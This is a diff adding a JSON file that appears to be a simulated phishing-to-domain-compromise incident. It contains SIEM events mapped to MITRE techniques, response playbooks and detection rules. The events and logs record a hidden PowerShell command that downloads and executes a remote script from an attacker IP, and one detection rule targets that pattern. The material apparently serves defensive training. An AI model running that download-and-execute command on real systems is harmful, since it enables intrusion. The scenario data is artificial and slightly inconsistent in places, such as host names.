@@ -1,0 +1,349 @@
+{
+  "campaignId": "de1980cb-d540-4de7-8715-cf2369304bee",
+  "startTime": "2025-11-24T19:59:54.933Z",
+  "endTime": "2025-11-27T19:59:54.933Z",
+  "events": [
+    {
+      "id": "8dc88048-a9c1-42ec-9508-d5440e711ec9",
+      "timestamp": "2025-11-24T20:39:54.933Z",
+      "source": "EmailGateway",
+      "eventType": "EMAIL_DELIVERED",
+      "severity": "low",
+      "details": {
+        "sender": "hr-updates@benefits-enrollment-secure.com",
+        "recipient": "jdoe@acme-corp.com",
+        "subject": "Urgent: 2025 Benefits Enrollment",
+        "attachment": "benefits_guide_2025.html"
+      },
+      "mitreTechniqueId": "T1566.001"
+    },
+    {
+      "id": "1208fec3-69e2-42a5-ae65-22079bd76c8b",
+      "timestamp": "2025-11-24T21:05:54.933Z",
+      "source": "WebProxy",
+      "eventType": "URL_CLICK",
+      "severity": "medium",
+      "details": {
+        "user": "jdoe@acme-corp.com",
+        "url": "http://benefits-enrollment-secure.com/login",
+        "category": "Uncategorized"
+      }
+    },
+    {
+      "id": "8f748390-d069-45f1-8a0f-007bcf2c54f5",
+      "timestamp": "2025-11-24T21:26:54.933Z",
+      "source": "Okta",
+      "eventType": "LOGIN_SUCCESS",
+      "severity": "medium",
+      "details": {
+        "user": "jdoe@acme-corp.com",
+        "ip": "45.13.12.99",
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "geo": "Unknown/Proxy"
+      },
+      "mitreTechniqueId": "T1078"
+    },
+    {
+      "id": "8caaae9e-6f61-4438-9bae-f7acd35dde3c",
+      "timestamp": "2025-11-25T01:10:54.933Z",
+      "source": "CrowdStrike",
+      "eventType": "PROCESS_EXECUTION",
+      "severity": "medium",
+      "details": {
+        "host": "WORKSTATION-JDOE",
+        "user": "jdoe@acme-corp.com",
+        "commandLine": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://45.13.12.99/recon.ps1'))\"",
+        "parentProcess": "explorer.exe"
+      },
+      "mitreTechniqueId": "T1059.001"
+    },
+    {
+      "id": "d80ccf73-dd59-4bfb-97bb-bb98a18e016e",
+      "timestamp": "2025-11-25T01:15:54.933Z",
+      "source": "Splunk",
+      "eventType": "ALERT_TRIGGERED",
+      "severity": "high",
+      "details": {
+        "alertName": "Suspicious PowerShell Download String",
+        "host": "WORKSTATION-JDOE"
+      }
+    },
+    {
+      "id": "d66519b5-b30b-4cb8-821c-17960e3a7802",
+      "timestamp": "2025-11-25T10:55:54.933Z",
+      "source": "WindowsSecurity",
+      "eventType": "LOGON_TYPE_3",
+      "severity": "medium",
+      "details": {
+        "host": "FILESERVER-01",
+        "user": "admin_service",
+        "sourceIp": "192.168.1.50"
+      },
+      "mitreTechniqueId": "T1021.001"
+    },
+    {
+      "id": "1a18ebdd-69c6-4af8-9a0e-92cb29799e48",
+      "timestamp": "2025-11-25T10:57:54.933Z",
+      "source": "CrowdStrike",
+      "eventType": "LATERAL_MOVEMENT",
+      "severity": "high",
+      "details": {
+        "sourceHost": "WORKSTATION-JDOE",
+        "targetHost": "FILESERVER-01",
+        "technique": "SMB Exec"
+      },
+      "mitreTechniqueId": "T1021.002"
+    },
+    {
+      "id": "488ebab2-6224-40db-ac48-b34ce5ba48f1",
+      "timestamp": "2025-11-26T10:10:54.933Z",
+      "source": "ActiveDirectory",
+      "eventType": "TICKET_REQUEST",
+      "severity": "medium",
+      "details": {
+        "service": "krbtgt",
+        "user": "jdoe@acme-corp.com",
+        "encryptionType": "RC4"
+      },
+      "mitreTechniqueId": "T1558.003"
+    },
+    {
+      "id": "15322ea0-f05d-4f99-ae8e-7da9fd001cc1",
+      "timestamp": "2025-11-26T22:01:54.933Z",
+      "source": "AzureAD",
+      "eventType": "SUSPICIOUS_SYNC_ACTIVITY",
+      "severity": "critical",
+      "details": {
+        "user": "Sync_Service_Account",
+        "ip": "45.13.12.99",
+        "action": "PasswordReset"
+      },
+      "mitreTechniqueId": "T1484.002"
+    },
+    {
+      "id": "45afffdc-e8a2-43e8-8afc-ef98c27850dc",
+      "timestamp": "2025-11-27T12:59:54.933Z",
+      "source": "SOAR",
+      "eventType": "CONTAINMENT_ACTION",
+      "severity": "high",
+      "details": {
+        "action": "Isolate Host",
+        "host": "WORKSTATION-PATIENT-ZERO",
+        "user": "jdoe",
+        "reason": "Confirmed Lateral Movement to DC"
+      }
+    }
+  ],
+  "containmentSuccess": true,
+  "containmentTime": "2025-11-27T12:59:54.933Z",
+  "artifacts": {
+    "logs": [
+      {
+        "_time": "2025-11-24T20:39:54.933Z",
+        "sourcetype": "emailgateway",
+        "event": {
+          "id": "8dc88048-a9c1-42ec-9508-d5440e711ec9",
+          "timestamp": "2025-11-24T20:39:54.933Z",
+          "source": "EmailGateway",
+          "eventType": "EMAIL_DELIVERED",
+          "severity": "low",
+          "details": {
+            "sender": "hr-updates@benefits-enrollment-secure.com",
+            "recipient": "jdoe@acme-corp.com",
+            "subject": "Urgent: 2025 Benefits Enrollment",
+            "attachment": "benefits_guide_2025.html"
+          },
+          "mitreTechniqueId": "T1566.001"
+        }
+      },
+      {
+        "_time": "2025-11-24T21:05:54.933Z",
+        "sourcetype": "webproxy",
+        "event": {
+          "id": "1208fec3-69e2-42a5-ae65-22079bd76c8b",
+          "timestamp": "2025-11-24T21:05:54.933Z",
+          "source": "WebProxy",
+          "eventType": "URL_CLICK",
+          "severity": "medium",
+          "details": {
+            "user": "jdoe@acme-corp.com",
+            "url": "http://benefits-enrollment-secure.com/login",
+            "category": "Uncategorized"
+          }
+        }
+      },
+      {
+        "_time": "2025-11-24T21:26:54.933Z",
+        "sourcetype": "okta",
+        "event": {
+          "id": "8f748390-d069-45f1-8a0f-007bcf2c54f5",
+          "timestamp": "2025-11-24T21:26:54.933Z",
+          "source": "Okta",
+          "eventType": "LOGIN_SUCCESS",
+          "severity": "medium",
+          "details": {
+            "user": "jdoe@acme-corp.com",
+            "ip": "45.13.12.99",
+            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "geo": "Unknown/Proxy"
+          },
+          "mitreTechniqueId": "T1078"
+        }
+      },
+      {
+        "_time": "2025-11-25T01:10:54.933Z",
+        "sourcetype": "crowdstrike",
+        "event": {
+          "id": "8caaae9e-6f61-4438-9bae-f7acd35dde3c",
+          "timestamp": "2025-11-25T01:10:54.933Z",
+          "source": "CrowdStrike",
+          "eventType": "PROCESS_EXECUTION",
+          "severity": "medium",
+          "details": {
+            "host": "WORKSTATION-JDOE",
+            "user": "jdoe@acme-corp.com",
+            "commandLine": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://45.13.12.99/recon.ps1'))\"",
+            "parentProcess": "explorer.exe"
+          },
+          "mitreTechniqueId": "T1059.001"
+        }
+      },
+      {
+        "_time": "2025-11-25T01:15:54.933Z",
+        "sourcetype": "splunk",
+        "event": {
+          "id": "d80ccf73-dd59-4bfb-97bb-bb98a18e016e",
+          "timestamp": "2025-11-25T01:15:54.933Z",
+          "source": "Splunk",
+          "eventType": "ALERT_TRIGGERED",
+          "severity": "high",
+          "details": {
+            "alertName": "Suspicious PowerShell Download String",
+            "host": "WORKSTATION-JDOE"
+          }
+        }
+      },
+      {
+        "_time": "2025-11-25T10:55:54.933Z",
+        "sourcetype": "windowssecurity",
+        "event": {
+          "id": "d66519b5-b30b-4cb8-821c-17960e3a7802",
+          "timestamp": "2025-11-25T10:55:54.933Z",
+          "source": "WindowsSecurity",
+          "eventType": "LOGON_TYPE_3",
+          "severity": "medium",
+          "details": {
+            "host": "FILESERVER-01",
+            "user": "admin_service",
+            "sourceIp": "192.168.1.50"
+          },
+          "mitreTechniqueId": "T1021.001"
+        }
+      },
+      {
+        "_time": "2025-11-25T10:57:54.933Z",
+        "sourcetype": "crowdstrike",
+        "event": {
+          "id": "1a18ebdd-69c6-4af8-9a0e-92cb29799e48",
+          "timestamp": "2025-11-25T10:57:54.933Z",
+          "source": "CrowdStrike",
+          "eventType": "LATERAL_MOVEMENT",
+          "severity": "high",
+          "details": {
+            "sourceHost": "WORKSTATION-JDOE",
+            "targetHost": "FILESERVER-01",
+            "technique": "SMB Exec"
+          },
+          "mitreTechniqueId": "T1021.002"
+        }
+      },
+      {
+        "_time": "2025-11-26T10:10:54.933Z",
+        "sourcetype": "activedirectory",
+        "event": {
+          "id": "488ebab2-6224-40db-ac48-b34ce5ba48f1",
+          "timestamp": "2025-11-26T10:10:54.933Z",
+          "source": "ActiveDirectory",
+          "eventType": "TICKET_REQUEST",
+          "severity": "medium",
+          "details": {
+            "service": "krbtgt",
+            "user": "jdoe@acme-corp.com",
+            "encryptionType": "RC4"
+          },
+          "mitreTechniqueId": "T1558.003"
+        }
+      },
+      {
+        "_time": "2025-11-26T22:01:54.933Z",
+        "sourcetype": "azuread",
+        "event": {
+          "id": "15322ea0-f05d-4f99-ae8e-7da9fd001cc1",
+          "timestamp": "2025-11-26T22:01:54.933Z",
+          "source": "AzureAD",
+          "eventType": "SUSPICIOUS_SYNC_ACTIVITY",
+          "severity": "critical",
+          "details": {
+            "user": "Sync_Service_Account",
+            "ip": "45.13.12.99",
+            "action": "PasswordReset"
+          },
+          "mitreTechniqueId": "T1484.002"
+        }
+      },
+      {
+        "_time": "2025-11-27T12:59:54.933Z",
+        "sourcetype": "soar",
+        "event": {
+          "id": "45afffdc-e8a2-43e8-8afc-ef98c27850dc",
+          "timestamp": "2025-11-27T12:59:54.933Z",
+          "source": "SOAR",
+          "eventType": "CONTAINMENT_ACTION",
+          "severity": "high",
+          "details": {
+            "action": "Isolate Host",
+            "host": "WORKSTATION-PATIENT-ZERO",
+            "user": "jdoe",
+            "reason": "Confirmed Lateral Movement to DC"
+          }
+        }
+      }
+    ],
+    "playbooks": [
+      {
+        "id": "PB-IDENTITY-001",
+        "name": "Identity Compromise Response",
+        "steps": [
+          "Verify user activity with user via out-of-band communication",
+          "Reset user password in AD and Okta",
+          "Revoke all Okta sessions",
+          "Check for MFA enrollments added recently",
+          "Isolate workstation CrowdStrike"
+        ]
+      },
+      {
+        "id": "PB-CLOUD-002",
+        "name": "Azure AD Suspicious Sync",
+        "steps": [
+          "Disable AAD Connect Sync Account",
+          "Review AAD Audit Logs for new Global Admins",
+          "Initiate Global Password Reset for Admins"
+        ]
+      }
+    ],
+    "detectionRules": [
+      {
+        "ruleId": "SIGMA-001",
+        "title": "Suspicious PowerShell Download",
+        "severity": "high",
+        "query": "CommandLine=\"*downloadstring*\" AND CommandLine=\"*http*\""
+      },
+      {
+        "ruleId": "SIGMA-002",
+        "title": "Okta Login from Rare IP",
+        "severity": "medium",
+        "query": "event.type=\"user.session.start\" AND security_context.as.organization.name!=\"CORP_ISP\""
+      }
+    ]
+  }
+}
